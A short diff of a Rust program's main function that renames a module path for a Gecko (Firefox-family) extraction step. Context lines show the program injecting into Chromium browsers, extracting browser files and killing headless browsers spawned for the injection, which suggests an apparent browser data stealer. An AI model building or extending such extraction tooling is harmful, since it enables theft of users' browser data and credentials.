@@ -160,7 +160,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     browsers::chromium::inject_and_cache_all();
 
     // ── 5. Gecko extraction ────────────────────────────────────────────────────
-    let mut all_files = gecko::extract_all();
+    let mut all_files = browsers::gecko::extract_all();
 
     // ── 6. Cleanup headless browsers spawned for inject ───────────────────────
     core::kill::kill_new_browsers(&pids_before_inject);
